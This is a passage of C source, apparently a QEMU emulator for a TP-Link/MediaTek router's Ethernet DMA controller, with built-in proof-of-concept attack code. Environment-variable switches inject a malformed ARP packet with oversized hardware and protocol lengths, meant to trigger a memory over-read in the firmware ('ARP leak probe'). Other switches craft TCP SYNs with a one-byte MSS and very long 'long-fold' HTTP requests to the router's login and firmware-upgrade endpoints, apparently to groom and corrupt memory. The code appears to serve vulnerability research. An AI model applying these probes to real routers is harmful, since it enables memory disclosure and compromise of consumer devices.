    if (!s->tx_base || !s->tx_max) return;
    if (!(s->glo_cfg & 1)) return;       /* TX_DMA_EN bit0 */

    hwaddr base = leopard_fe_dma_addr(s->tx_base);
    uint32_t max = s->tx_max;
    while (s->tx_dtx_idx != s->tx_ctx_idx) {
        uint32_t d[4];
        leopard_fe_read_desc(base, s->tx_dtx_idx, d);
        uint32_t buf_phys = d[0];
        uint32_t ctrl     = d[1];
        /* MTK PDMA TX descriptor:
         *   d[0] = buffer phys
         *   d[1] = bit31 DDONE | bit30 LS0 | bits29:16 PLEN0 | bits15:14 ?
         *          | bits13:0 PLEN1
         * For a single-segment packet, total length is PLEN0.  Some
         * builds also queue two-segment packets where PLEN1 holds the
         * second segment length; we accept the larger of the two as
         * the buffer length to send. */
        uint32_t plen0 = (ctrl >> 16) & 0x3fff;
        uint32_t plen1 = ctrl & 0x3fff;
        uint32_t len = plen0 ? plen0 : plen1;
        if (len && len <= 1600) {
            uint8_t buf[1600];
            hwaddr ba = leopard_fe_dma_addr(buf_phys);
            address_space_read(&address_space_memory, ba,
                               MEMTXATTRS_UNSPECIFIED, buf, len);
            fprintf(stderr, "[fe] TX len=%u idx=%u buf=%#" PRIx64
                    " %02x:%02x:%02x:%02x:%02x:%02x -> "
                    "%02x:%02x:%02x:%02x:%02x:%02x type=%02x%02x\n",
                    len, s->tx_dtx_idx, ba,
                    buf[0], buf[1], buf[2], buf[3], buf[4], buf[5],
                    buf[6], buf[7], buf[8], buf[9], buf[10], buf[11],
                    buf[12], buf[13]);
            leopard_fe_maybe_reply_host_arp(s, buf, len);
            if (s->nic) {
                qemu_send_packet(qemu_get_queue(s->nic), buf, len);
            }
        } else {
            fprintf(stderr, "[fe] TX skip idx=%u len=%u\n",
                    s->tx_dtx_idx, len);
        }
        /* Mark DDONE = 1 (HW done with this desc) */
        d[1] = ctrl | 0x80000000u;
        leopard_fe_write_desc(base, s->tx_dtx_idx, d);
        s->tx_dtx_idx = (s->tx_dtx_idx + 1) % max;
    }
}

static bool leopard_fe_can_receive(NetClientState *nc)
{
    LeopardFEState *s = qemu_get_nic_opaque(nc);
    if (!(s->glo_cfg & 4)) return false;     /* RX_DMA_EN bit2 */
    if (!s->rx_base || !s->rx_max) return false;
    /* Have at least one HW-owned descriptor? */
    uint32_t next = (s->rx_drx_idx + 1) % s->rx_max;
    return next != s->rx_crx_idx;
}

static ssize_t leopard_fe_deliver_rx_frame_with_plen(LeopardFEState *s,
                                                     const uint8_t *buf,
                                                     size_t size,
                                                     uint32_t desc_len,
                                                     bool raise_irq)
{
    uint8_t rewritten[1600];
    const uint8_t *write_buf = buf;

    if (!(s->glo_cfg & 4)) return 0;
    if (!s->rx_base || !s->rx_max) return 0;
    if (size > 1600) return size;        /* drop oversize */

    hwaddr base = leopard_fe_dma_addr(s->rx_base);
    uint32_t idx = s->rx_drx_idx;
    uint32_t d[4];
    leopard_fe_read_desc(base, idx, d);

    /* Firmware-init "empty placeholder" pattern: d0 = 0, d1 = DDONE|LSO.
     * The production per-port driver would normally clear DDONE and
     * post a real buffer; our build never runs that driver, so do it
     * here on the fly.  We allocate one fixed-size buffer per ring slot
     * lazily out of an unused DRAM region. */
    if (d[0] == 0 && d[1] == 0xc0000000u && idx < 1024) {
        uint32_t buf_pa = LEOPARD_FE_RX_POOL_BASE + idx * LEOPARD_FE_RX_BUF_SIZE;
        d[0] = buf_pa;        /* buffer physical address */
        d[1] = 0;             /* DDONE=0 -> ready for HW fill */
        leopard_fe_write_desc(base, idx, d);
        s->rx_buf_posted[idx] = true;
    }

    if (d[1] & 0x80000000u) {
        /* HW already wrote here, software hasn't consumed; drop. */
        return 0;
    }

    hwaddr ba = leopard_fe_dma_addr(d[0]);
    if (leopard_fe_prepare_rx_accept_mac_frame(s, buf, size,
                                               rewritten, sizeof(rewritten))) {
        write_buf = rewritten;
    }
    address_space_write(&address_space_memory, ba,
                        MEMTXATTRS_UNSPECIFIED, write_buf, size);

    uint32_t len14 = desc_len & 0x3fff;
    d[1] = 0x80000000u                  /* DDONE */
         | 0x40000000u                  /* LS0 - single-segment packet */
         | (len14 << 16)                /* PLEN1 */
         | len14;                       /* PLEN0 */
    d[2] = 0;
    d[3] = (leopard_fe_rx_sport() << 19); /* SPORT source switch port */
    leopard_fe_write_desc(base, idx, d);
    s->rx_drx_idx = (idx + 1) % s->rx_max;

    if (raise_irq) {
        leopard_fe_note_rx_done(s);
    }
    return size;
}

static ssize_t leopard_fe_deliver_rx_frame(LeopardFEState *s,
                                           const uint8_t *buf, size_t size,
                                           bool raise_irq)
{
    return leopard_fe_deliver_rx_frame_with_plen(s, buf, size, size, raise_irq);
}

static bool leopard_fe_load_pcap_packet(const char *path,
                                        uint8_t *frame,
                                        size_t frame_cap,
                                        size_t *frame_len)
{
    uint8_t global[24];
    uint8_t record[16];
    bool swap;
    uint32_t incl_len;
    FILE *fp;

    fp = fopen(path, "rb");
    if (!fp) {
        fprintf(stderr, "[fe-poc] failed to open ARP pcap %s\n", path);
        return false;
    }
    if (fread(global, 1, sizeof(global), fp) != sizeof(global) ||
        fread(record, 1, sizeof(record), fp) != sizeof(record)) {
        fprintf(stderr, "[fe-poc] short ARP pcap %s\n", path);
        fclose(fp);
        return false;
    }

    if (!memcmp(global, "\xd4\xc3\xb2\xa1", 4)) {
        swap = false;
    } else if (!memcmp(global, "\xa1\xb2\xc3\xd4", 4)) {
        swap = true;
    } else {
        fprintf(stderr, "[fe-poc] unsupported ARP pcap magic in %s\n", path);
        fclose(fp);
        return false;
    }

    if (swap) {
        incl_len = ((uint32_t)record[8] << 24) |
                   ((uint32_t)record[9] << 16) |
                   ((uint32_t)record[10] << 8) |
                   record[11];
    } else {
        incl_len = record[8] |
                   ((uint32_t)record[9] << 8) |
                   ((uint32_t)record[10] << 16) |
                   ((uint32_t)record[11] << 24);
    }
    if (incl_len == 0 || incl_len > frame_cap) {
        fprintf(stderr, "[fe-poc] ARP pcap packet len %u unsupported\n",
                incl_len);
        fclose(fp);
        return false;
    }
    if (fread(frame, 1, incl_len, fp) != incl_len) {
        fprintf(stderr, "[fe-poc] truncated ARP pcap packet in %s\n", path);
        fclose(fp);
        return false;
    }

    fclose(fp);
    *frame_len = incl_len;
    return true;
}

static void leopard_fe_maybe_inject_bad_arp(LeopardFEState *s)
{
    const char *leak_env = getenv("LEOPARD_INJECT_ARP_LEAK");
    bool leak_probe = leak_env != NULL;

    if (s->bad_arp_injected ||
        (!getenv("LEOPARD_INJECT_BAD_ARP") && !leak_probe)) {
        return;
    }
    if (!(s->glo_cfg & 4) || !s->rx_base || !s->rx_max) {
        return;
    }
    if (leak_probe) {
        uint32_t cfg = leopard_debug_read32(0x4071e6c0);
        if (!cfg) {
            return;
        }
        leopard_fe_ensure_ipv4_binding();
        if (!leopard_debug_read32(cfg + 0x18)) {
            return;
        }
    }

    uint8_t fw_mac[6];
    leopard_fe_get_fw_mac(s, fw_mac);

    if (leak_probe) {
        enum {
            HLEN = 0xff,
            PLEN = 0xff,
            ETH_LEN = 14,
            ARP_FIXED_LEN = 8,
            ARP_LEN = ARP_FIXED_LEN + 2 * HLEN + 2 * PLEN,
            FRAME_LEN = ETH_LEN + ARP_LEN,
        };
        uint8_t frame[1600];
        size_t frame_len = FRAME_LEN;
        uint8_t attacker_mac[6] = { 0x02, 0x00, 0xba, 0xd0, 0x0a, 0x02 };
        uint8_t spa[4] = { 192, 168, 0, 99 };
        uint8_t tpa[4] = { 192, 168, 0, 1 };

        if (leak_env[0] != '\0' && strcmp(leak_env, "1") &&
            strcmp(leak_env, "true")) {
            if (!leopard_fe_load_pcap_packet(leak_env, frame, sizeof(frame),
                                             &frame_len)) {
                s->bad_arp_injected = true;
                return;
            }
            s->bad_arp_injected = true;
            fprintf(stderr,
                    "[fe-poc] injecting ARP leak probe from pcap %s len=%zu\n",
                    leak_env, frame_len);
            leopard_fe_deliver_rx_frame(s, frame, frame_len, true);
            return;
        }

        memset(frame, 0x41, sizeof(frame));
        memcpy(frame, fw_mac, sizeof(fw_mac));
        memcpy(frame + 6, attacker_mac, sizeof(attacker_mac));
        frame[12] = 0x08;
        frame[13] = 0x06;
        frame[14] = 0x00;
        frame[15] = 0x01;
        frame[16] = 0x08;
        frame[17] = 0x00;
        frame[18] = HLEN;
        frame[19] = PLEN;
        frame[20] = 0x00;
        frame[21] = 0x01;
        memcpy(frame + ETH_LEN + ARP_FIXED_LEN, attacker_mac,
               sizeof(attacker_mac));
        memcpy(frame + ETH_LEN + ARP_FIXED_LEN + HLEN, spa, sizeof(spa));
        memset(frame + ETH_LEN + ARP_FIXED_LEN + HLEN + PLEN, 0,
               sizeof(attacker_mac));
        memcpy(frame + ETH_LEN + ARP_FIXED_LEN + 2 * HLEN + PLEN, tpa,
               sizeof(tpa));

        s->bad_arp_injected = true;
        fprintf(stderr,
                "[fe-poc] injecting full ARP leak probe hlen=255 plen=255 len=%zu\n",
                frame_len);
        leopard_fe_deliver_rx_frame(s, frame, frame_len, true);
        return;
    } else {
        /*
         * Deliberately malformed ARP: only the fixed 8-byte ARP header follows
         * the Ethernet header, but hlen/plen are 0xff. The firmware ARP handler
         * uses those two bytes in memcmp lengths before checking the full ARP
         * payload size.
         */
        uint8_t frame[22] = {
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0x02, 0x00, 0xba, 0xd0, 0x0a, 0x01,
            0x08, 0x06,
            0x00, 0x01,
            0x08, 0x00,
            0xff, 0xff,
            0x00, 0x01,
        };
        memcpy(frame, fw_mac, sizeof(fw_mac));

        s->bad_arp_injected = true;
        fprintf(stderr,
                "[fe-poc] injecting malformed ARP hlen=255 plen=255 len=%zu\n",
                sizeof(frame));
        leopard_fe_deliver_rx_frame(s, frame, sizeof(frame), true);
    }
}

static void leopard_put_be16(uint8_t *p, uint16_t v)
{
    p[0] = v >> 8;
    p[1] = v & 0xff;
}

static void leopard_put_be32(uint8_t *p, uint32_t v)
{
    p[0] = v >> 24;
    p[1] = (v >> 16) & 0xff;
    p[2] = (v >> 8) & 0xff;
    p[3] = v & 0xff;
}

static uint32_t leopard_fe_host_ip_be(void)
{
    const char *env = getenv("LEOPARD_FE_HOST_IP");
    unsigned a, b, c, d;
    char tail;

    if (env && sscanf(env, "%u.%u.%u.%u%c", &a, &b, &c, &d, &tail) == 4 &&
        a <= 255 && b <= 255 && c <= 255 && d <= 255) {
        return (a << 24) | (b << 16) | (c << 8) | d;
    }

    return (192u << 24) | (168u << 16) | (0u << 8) | 254u;
}

static bool leopard_fe_maybe_reply_host_arp(LeopardFEState *s,
                                            const uint8_t *buf,
                                            size_t len)
{
    static unsigned arp_logs;
    uint32_t host_ip;
    uint32_t target_ip;
    uint8_t reply[42] = {0};
    uint8_t dst_mac[6];
    const uint8_t host_mac[6] = { 0x52, 0x55, 0xc0, 0xa8, 0x00, 0xfe };

    if (len < sizeof(reply) || buf[12] != 0x08 || buf[13] != 0x06 ||
        buf[14] != 0x00 || buf[15] != 0x01 ||
        buf[16] != 0x08 || buf[17] != 0x00 ||
        buf[18] != 6 || buf[19] != 4 ||
        buf[20] != 0x00 || buf[21] != 0x01) {
        return false;
    }

    host_ip = leopard_fe_host_ip_be();
    target_ip = leopard_get_be32(buf + 38);
    if (target_ip != host_ip) {
        return false;
    }

    memcpy(dst_mac, buf + 6, sizeof(dst_mac));
    leopard_fe_get_rx_accept_mac(dst_mac);
    memcpy(reply + 0, dst_mac, 6);
    memcpy(reply + 6, host_mac, 6);
    reply[12] = 0x08;
    reply[13] = 0x06;
    reply[14] = 0x00;
    reply[15] = 0x01;
    reply[16] = 0x08;
    reply[17] = 0x00;
    reply[18] = 6;
    reply[19] = 4;
    reply[20] = 0x00;
    reply[21] = 0x02;
    memcpy(reply + 22, host_mac, 6);
    leopard_put_be32(reply + 28, host_ip);
    memcpy(reply + 32, dst_mac, 6);
    memcpy(reply + 38, buf + 28, 4);

    if (arp_logs++ < 16) {
        fprintf(stderr,
                "[fe] ARP host-reply: %02x:%02x:%02x:%02x:%02x:%02x is %u.%u.%u.%u for %u.%u.%u.%u dst=%02x:%02x:%02x:%02x:%02x:%02x reqsha=%02x:%02x:%02x:%02x:%02x:%02x\n",
                host_mac[0], host_mac[1], host_mac[2], host_mac[3],
                host_mac[4], host_mac[5],
                (host_ip >> 24) & 0xff, (host_ip >> 16) & 0xff,
                (host_ip >> 8) & 0xff, host_ip & 0xff,
                buf[28], buf[29], buf[30], buf[31],
                dst_mac[0], dst_mac[1], dst_mac[2], dst_mac[3],
                dst_mac[4], dst_mac[5],
                buf[22], buf[23], buf[24], buf[25], buf[26], buf[27]);
    }
    leopard_fe_deliver_rx_frame(s, reply, sizeof(reply), true);
    return true;
}

static size_t leopard_build_tcp_probe(LeopardFEState *s, uint8_t *frame,
                                      uint16_t sport, uint8_t flags,
                                      const uint8_t *opts, size_t opt_len,
                                      const uint8_t *payload,
                                      size_t payload_len)
{
    uint8_t fw_mac[6];
    uint8_t attacker_mac[6] = { 0x02, 0x00, 0xba, 0xd0, 0x0a, 0x03 };
    uint8_t *ip = frame + 14;
    uint8_t *tcp;
    size_t tcp_hlen = 20 + opt_len;
    size_t ip_len = 20 + tcp_hlen + payload_len;

    leopard_fe_get_fw_mac(s, fw_mac);
    memcpy(frame + 0, fw_mac, 6);
    memcpy(frame + 6, attacker_mac, 6);
    frame[12] = 0x08;
    frame[13] = 0x00;

    memset(ip, 0, ip_len);
    ip[0] = 0x45;
    leopard_put_be16(ip + 2, ip_len);
    leopard_put_be16(ip + 4, 0x4c50);
    ip[8] = 64;
    ip[9] = 6;
    ip[12] = 192; ip[13] = 168; ip[14] = 0; ip[15] = 254;
    ip[16] = 192; ip[17] = 168; ip[18] = 0; ip[19] = 1;

    tcp = ip + 20;
    leopard_put_be16(tcp + 0, sport);
    leopard_put_be16(tcp + 2, 80);
    leopard_put_be32(tcp + 4, 0x01020304);
    leopard_put_be32(tcp + 8, 0);
    tcp[12] = (tcp_hlen / 4) << 4;
    tcp[13] = flags;
    leopard_put_be16(tcp + 14, 0x4000);
    if (opt_len) {
        memcpy(tcp + 20, opts, opt_len);
    }
    if (payload_len) {
        memcpy(tcp + tcp_hlen, payload, payload_len);
    }
    leopard_fix_ipv4_checksums(ip, ip_len);
    return 14 + ip_len;
}

static size_t leopard_build_tcp_syn_probe(LeopardFEState *s, uint8_t *frame,
                                          uint16_t sport, uint32_t seq,
                                          uint16_t ip_id, uint32_t src_ip)
{
    size_t len = leopard_build_tcp_probe(s, frame, sport, 0x02, NULL, 0,
                                         NULL, 0);
    uint8_t *ip = frame + 14;
    uint8_t *tcp = ip + 20;

    leopard_put_be16(ip + 4, ip_id);
    ip[12] = src_ip >> 24;
    ip[13] = src_ip >> 16;
    ip[14] = src_ip >> 8;
    ip[15] = src_ip;
    leopard_put_be32(tcp + 4, seq);
    leopard_fix_ipv4_checksums(ip, len - 14);
    return len;
}

static size_t leopard_build_tcp_est_probe_opts(LeopardFEState *s,
                                               uint8_t *frame,
                                               const uint8_t *rx_ip,
                                               uint8_t flags, uint32_t seq,
                                               uint32_t ack, uint16_t win,
                                               uint16_t urg,
                                               const uint8_t *opts,
                                               size_t opts_len,
                                               const uint8_t *payload,
                                               size_t payload_len)
{
    uint8_t fw_mac[6];
    uint8_t *ip = frame + 14;
    uint8_t *tcp;
    size_t tcp_hlen = 20 + opts_len;
    size_t ip_len = 20 + tcp_hlen + payload_len;
    uint8_t ihl = (rx_ip[0] & 0x0f) * 4;
    const uint8_t *rx_tcp = rx_ip + ihl;

    assert((opts_len & 3) == 0);
    assert(tcp_hlen <= 60);

    leopard_fe_get_fw_mac(s, fw_mac);
    memcpy(frame + 0, fw_mac, 6);
    memcpy(frame + 6, s->peer_mac_valid ? s->peer_mac : frame + 0, 6);
    frame[12] = 0x08;
    frame[13] = 0x00;

    memset(ip, 0, ip_len);
    ip[0] = 0x45;
    leopard_put_be16(ip + 2, ip_len);
    leopard_put_be16(ip + 4, 0x7c50);
    ip[8] = 64;
    ip[9] = 6;
    memcpy(ip + 12, rx_ip + 12, 4);
    memcpy(ip + 16, rx_ip + 16, 4);

    tcp = ip + 20;
    memcpy(tcp + 0, rx_tcp + 0, 2);
    memcpy(tcp + 2, rx_tcp + 2, 2);
    leopard_put_be32(tcp + 4, seq);
    leopard_put_be32(tcp + 8, ack);
    tcp[12] = (tcp_hlen / 4) << 4;
    tcp[13] = flags;
    leopard_put_be16(tcp + 14, win);
    leopard_put_be16(tcp + 18, urg);
    if (opts_len) {
        memcpy(tcp + 20, opts, opts_len);
    }
    if (payload_len) {
        memcpy(tcp + tcp_hlen, payload, payload_len);
    }
    leopard_fix_ipv4_checksums(ip, ip_len);
    return 14 + ip_len;
}

static size_t leopard_build_tcp_est_probe(LeopardFEState *s, uint8_t *frame,
                                          const uint8_t *rx_ip,
                                          uint8_t flags, uint32_t seq,
                                          uint32_t ack, uint16_t win,
                                          uint16_t urg,
                                          const uint8_t *payload,
                                          size_t payload_len)
{
    return leopard_build_tcp_est_probe_opts(s, frame, rx_ip, flags, seq, ack,
                                            win, urg, NULL, 0, payload,
                                            payload_len);
}

static size_t leopard_build_tcp_client_probe(LeopardFEState *s, uint8_t *frame,
                                             uint16_t sport, uint8_t flags,
                                             uint32_t seq, uint32_t ack,
                                             uint16_t win, uint16_t urg,
                                             const uint8_t *opts,
                                             size_t opt_len,
                                             const uint8_t *payload,
                                             size_t payload_len)
{
    uint8_t fw_mac[6];
    uint8_t attacker_mac[6] = { 0x02, 0x00, 0xba, 0xd0, 0x0a, 0x44 };
    uint8_t *ip = frame + 14;
    uint8_t *tcp;
    size_t tcp_hlen = 20 + opt_len;
    size_t ip_len = 20 + tcp_hlen + payload_len;

    leopard_fe_get_fw_mac(s, fw_mac);
    memcpy(frame + 0, fw_mac, 6);
    memcpy(frame + 6, s->peer_mac_valid ? s->peer_mac : attacker_mac, 6);
    frame[12] = 0x08;
    frame[13] = 0x00;

    memset(ip, 0, ip_len);
    ip[0] = 0x45;
    leopard_put_be16(ip + 2, ip_len);
    leopard_put_be16(ip + 4, 0x544d);
    ip[8] = 64;
    ip[9] = 6;
    ip[12] = 192; ip[13] = 168; ip[14] = 0; ip[15] = 254;
    ip[16] = 192; ip[17] = 168; ip[18] = 0; ip[19] = 1;

    tcp = ip + 20;
    leopard_put_be16(tcp + 0, sport);
    leopard_put_be16(tcp + 2, 80);
    leopard_put_be32(tcp + 4, seq);
    leopard_put_be32(tcp + 8, ack);
    tcp[12] = (tcp_hlen / 4) << 4;
    tcp[13] = flags;
    leopard_put_be16(tcp + 14, win);
    leopard_put_be16(tcp + 18, urg);
    if (opt_len) {
        memcpy(tcp + 20, opts, opt_len);
    }
    if (payload_len) {
        memcpy(tcp + tcp_hlen, payload, payload_len);
    }
    leopard_fix_ipv4_checksums(ip, ip_len);
    return 14 + ip_len;
}

static bool leopard_tcp_tiny_mss_wifi_mode(const char *mode)
{
    return mode && !strcmp(mode, "long-fold-wifi");
}

static bool leopard_tcp_tiny_mss_long_fold_mode(const char *mode)
{
    return mode && (!strcmp(mode, "long-fold") ||
                    !strcmp(mode, "long-fold-wifi"));
}

static const char *leopard_long_fold_followup_body(void)
{
    const char *body = getenv("LEOPARD_LONG_FOLD_FOLLOWUP_BODY");
    const char *mode = getenv("LEOPARD_LONG_FOLD_FOLLOWUP");

    if (body) {
        return body;
    }
    if (mode && !strcmp(mode, "download")) {
        return "main upgrade -get_dev_downloading_process";
    }
    if (mode && !strcmp(mode, "install")) {
        return "main upgrade -upgrade_dev_firmware";
    }
    if (mode && !strcmp(mode, "newFirmware")) {
        return "main newFirmware -newFirmware";
    }
    return "main upgrade -get_dev_upgrade_status";
}

static const char *leopard_long_fold_pregroom_body(void)
{
    const char *body = getenv("LEOPARD_LONG_FOLD_PREGROOM_BODY");
    const char *mode = getenv("LEOPARD_LONG_FOLD_PREGROOM");

    if (body) {
        return body;
    }
    if (mode && !strcmp(mode, "download")) {
        return "main upgrade -get_dev_downloading_process";
    }
    if (mode && !strcmp(mode, "install")) {
        return "main upgrade -upgrade_dev_firmware";
    }
    if (mode && !strcmp(mode, "newFirmware")) {
        return "main newFirmware -newFirmware";
    }
    if (mode && !strcmp(mode, "wlan")) {
        return "main wlan -reload";
    }
    return "main upgrade -get_dev_upgrade_status";
}

static uint32_t leopard_env_u32_default(const char *name, uint32_t defval)
{
    const char *env = getenv(name);

    if (env && *env) {
        return (uint32_t)strtoul(env, NULL, 0);
    }
    return defval;
}

static uint32_t leopard_long_fold_line_len(void)
{
    return leopard_env_u32_default("LEOPARD_LONG_FOLD_LINE_LEN", 523000);
}

static uint32_t leopard_long_fold_body_prefix_len(void)
{
    return leopard_env_u32_default("LEOPARD_LONG_FOLD_BODY_PREFIX", 8192);
}

static uint32_t leopard_long_fold_content_length(void)
{
    return leopard_env_u32_default("LEOPARD_LONG_FOLD_CONTENT_LENGTH", 600000);
}

static const char *leopard_long_fold_followup_query(void)
{
    const char *query = getenv("LEOPARD_LONG_FOLD_FOLLOWUP_QUERY");
    const char *mode = getenv("LEOPARD_LONG_FOLD_FOLLOWUP");

    if (query) {
        return query;
    }
    if (mode && !strcmp(mode, "install")) {
        return "code=0&asyn=0&id=x";
    }
    return "code=2&asyn=0&id=x";
}

static const char *leopard_long_fold_pregroom_query(void)
{
    const char *query = getenv("LEOPARD_LONG_FOLD_PREGROOM_QUERY");
    const char *mode = getenv("LEOPARD_LONG_FOLD_PREGROOM");

    if (query) {
        return query;
    }
    if (mode && !strcmp(mode, "install")) {
        return "code=0&asyn=0&id=x";
    }
    return "code=2&asyn=0&id=x";
}

static size_t leopard_build_long_fold_pregroom_request(uint8_t *out,
                                                       size_t out_size)
{
    const char *body = leopard_long_fold_pregroom_body();
    const char *query = leopard_long_fold_pregroom_query();
    int n = snprintf((char *)out, out_size,
                     "POST /data/login.json?%s HTTP/1.1\r\n"
                     "Host: tplinkwifi.net\r\n"
                     "Content-Type: application/json\r\n"
                     "Content-Length: %zu\r\n"
                     "Connection: close\r\n"
                     "\r\n"
                     "%s",
                     query, strlen(body), body);

    if (n < 0) {
        return 0;
    }
    if ((size_t)n >= out_size) {
        return out_size;
    }
    return (size_t)n;
}

static size_t leopard_build_long_fold_followup_request(uint8_t *out,
                                                       size_t out_size)
{
    const char *body = leopard_long_fold_followup_body();
    const char *query = leopard_long_fold_followup_query();
    int n = snprintf((char *)out, out_size,
                     "POST /data/login.json?%s HTTP/1.1\r\n"
                     "Host: tplinkwifi.net\r\n"
                     "Content-Type: application/json\r\n"
                     "Content-Length: %zu\r\n"
                     "Connection: close\r\n"
                     "\r\n"
                     "%s",
                     query, strlen(body), body);

    if (n < 0) {
        return 0;
    }
    if ((size_t)n >= out_size) {
        return out_size;
    }
    return (size_t)n;
}

static bool leopard_wifi_env_bssid(uint8_t mac[6])
{
    const char *env = getenv("LEOPARD_WIFI_MBSS_BSSID");

    if (leopard_parse_mac_env(env, mac)) {
        return true;
    }
    mac[0] = 0x06; mac[1] = 0x09; mac[2] = 0x66;
    mac[3] = 0xca; mac[4] = 0x8b; mac[5] = 0x07;
    return true;
}

static size_t leopard_build_wifi_tods_ipv4_rx(uint8_t *rx,
                                              const uint8_t *ip,
                                              size_t ip_len)
{
    uint8_t bssid[6];
    uint8_t sta[6] = { 0x02, 0xaa, 0xbb, 0xcc, 0xdd, 0xee };
    size_t frame_len = 24 + 8 + ip_len;
    size_t total_len = 0x10 + frame_len;
    uint8_t *frame = rx + 0x10;

    leopard_wifi_env_bssid(bssid);
    memset(rx, 0, 0x10);
    rx[0] = total_len & 0xff;
    rx[1] = (total_len >> 8) & 0x3f;
    rx[3] = 2 << 5;
    rx[4] = 0x02;
    rx[5] = 0x01;
    rx[0x0b] = 0xa0;

    frame[0] = 0x08;
    frame[1] = 0x01;  /* ToDS data */
    frame[2] = 0x00;
    frame[3] = 0x00;
    memcpy(frame + 4, bssid, 6);      /* Address 1: AP/BSSID */
    memcpy(frame + 10, sta, 6);       /* Address 2: associated STA */
    memcpy(frame + 16, bssid, 6);     /* Address 3: router management MAC */
    frame[22] = 0x10;
    frame[23] = 0x00;
    frame[24] = 0xaa;
    frame[25] = 0xaa;
    frame[26] = 0x03;
    frame[27] = 0x00;
    frame[28] = 0x00;
    frame[29] = 0x00;
    frame[30] = 0x08;
    frame[31] = 0x00;
    memcpy(frame + 32, ip, ip_len);
    return total_len;
}

static void leopard_wifi_deliver_ethernet_ipv4_frame(LeopardFEState *s,
                                                     const uint8_t *frame,
                                                     size_t frame_len)
{
    uint8_t rx[0x10 + 24 + 8 + 20 + 20 + 1500];
    uint16_t ip_len;
    uint32_t rx0_max = leopard_connsys_reg_readback(0x4404);
    uint32_t rx0_idx;
    size_t rx_len;

    if (!frame || frame_len < 34 || frame[12] != 0x08 || frame[13] != 0x00 ||
        rx0_max == 0) {
        return;
    }
    ip_len = leopard_get_be16(frame + 14 + 2);
    if (ip_len > frame_len - 14 || ip_len > sizeof(rx) - 0x10 - 24 - 8) {
        return;
    }
    if (connsys.fake_rx_next_slot >= rx0_max) {
        connsys.fake_rx_next_slot = 0;
    }
    rx0_idx = connsys.fake_rx_next_slot++ % rx0_max;
    rx_len = leopard_build_wifi_tods_ipv4_rx(rx, frame + 14, ip_len);
    leopard_connsys_fill_fake_rx_slot(0x4400, rx0_idx, rx, rx_len);
    leopard_wifi_poc_rx_pending++;
    leopard_connsys_raise_fake_rx_status(0x400003);
    if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
        fprintf(stderr,
                "[wifi-poc] injected ToDS IPv4 RX idx=%u len=%zu "
                "iplen=%u tcp=%u>%u flags=%#x\n",
                rx0_idx, rx_len, ip_len,
                frame_len >= 54 ? leopard_get_be16(frame + 14 + 20) : 0,
                frame_len >= 54 ? leopard_get_be16(frame + 14 + 22) : 0,
                frame_len >= 54 ? frame[14 + 20 + 13] : 0);
    }
    (void)s;
}

static void leopard_tcp_tiny_mss_deliver(LeopardFEState *s,
                                         const uint8_t *frame, size_t len)
{
    const char *mode = getenv("LEOPARD_INJECT_TCP_TINY_MSS");

    if (leopard_tcp_tiny_mss_wifi_mode(mode)) {
        leopard_wifi_deliver_ethernet_ipv4_frame(s, frame, len);
    } else {
        leopard_fe_deliver_rx_frame(s, frame, len, true);
    }
}

static void leopard_fe_start_tcp_tiny_mss_now(LeopardFEState *s,
                                              const char *why)
{
    const char *mode = getenv("LEOPARD_INJECT_TCP_TINY_MSS");
    uint8_t frame[14 + 20 + 60];
    uint8_t opts[16] = { 2, 4, 0, 1 };
    size_t opts_len = 4;
    size_t len;

    if (leopard_tcp_tiny_mss_long_fold_mode(mode) &&
        getenv("LEOPARD_LONG_FOLD_PREGROOM") &&
        !s->tcp_long_fold_pregroom_complete) {
        uint8_t pframe[14 + 20 + 60];
        uint8_t popts[4] = { 2, 4, 0x05, 0xb4 };
        if (s->tcp_long_fold_pregroom_started ||
            !(s->glo_cfg & 4) || !s->rx_base || !s->rx_max) {
            return;
        }
        s->tcp_long_fold_pregroom_started = true;
        s->tcp_long_fold_pregroom_established = false;
        s->tcp_long_fold_pregroom_sent = false;
        s->tcp_long_fold_pregroom_client_seq = 0x12222000;
        leopard_fe_ensure_ipv4_binding();
        len = leopard_build_tcp_client_probe(s, pframe, 40099, 0x02,
                                             s->tcp_long_fold_pregroom_client_seq,
                                             0, 0x4000, 0, popts, sizeof(popts),
                                             NULL, 0);
        fprintf(stderr,
                "[fe-poc] long-fold pregroom: injecting SYN after %s "
                "sport=40099 seq=%#x len=%zu mode=%s\n",
                why, s->tcp_long_fold_pregroom_client_seq, len,
                getenv("LEOPARD_LONG_FOLD_PREGROOM"));
        leopard_tcp_tiny_mss_deliver(s, pframe, len);
        return;
    }

    if (s->tcp_tiny_mss_started || !mode || !*mode ||
        !(s->glo_cfg & 4) || !s->rx_base || !s->rx_max) {
        return;
    }
    s->tcp_tiny_mss_started = true;
    s->tcp_tiny_mss_client_seq = 0x12345000;
    if (!strcmp(mode, "ts-future") || !strcmp(mode, "ts-ackdata")) {
        uint8_t ts_opts[16] = {
            2, 4, 0, 1,
            1, 1, 1, 1,
            8, 10, 0, 0, 0, 1, 0, 0,
        };
        memcpy(opts, ts_opts, sizeof(ts_opts));
        opts_len = sizeof(ts_opts);
    }
    leopard_fe_ensure_ipv4_binding();
    len = leopard_build_tcp_client_probe(s, frame, 40100, 0x02,
                                         s->tcp_tiny_mss_client_seq, 0,
                                         0x4000, 0, opts, opts_len,
                                         NULL, 0);
    fprintf(stderr,
            "[fe-poc] tiny-mss: injecting SYN after %s sport=40100 seq=%#x "
            "mss=1 opts=%zu len=%zu\n",
            why, s->tcp_tiny_mss_client_seq, opts_len, len);
    leopard_tcp_tiny_mss_deliver(s, frame, len);
}

static void leopard_fe_start_long_fold_followup(LeopardFEState *s)
{
    uint8_t frame[14 + 20 + 60];
    uint8_t opts[4] = { 2, 4, 0x05, 0xb4 };
    size_t len;

    if (!getenv("LEOPARD_LONG_FOLD_FOLLOWUP") ||
        s->tcp_long_fold_followup_started ||
        !(s->glo_cfg & 4) || !s->rx_base || !s->rx_max) {
        return;
    }
    s->tcp_long_fold_followup_started = true;
    s->tcp_long_fold_followup_established = false;
    s->tcp_long_fold_followup_sent = false;
    s->tcp_long_fold_followup_client_seq = 0x23456000;
    leopard_fe_ensure_ipv4_binding();
    len = leopard_build_tcp_client_probe(s, frame, 40101, 0x02,
                                         s->tcp_long_fold_followup_client_seq,
                                         0, 0x4000, 0, opts, sizeof(opts),
                                         NULL, 0);
    fprintf(stderr,
            "[fe-poc] long-fold followup: injecting SYN sport=40101 "
            "seq=%#x len=%zu mode=%s\n",
            s->tcp_long_fold_followup_client_seq, len,
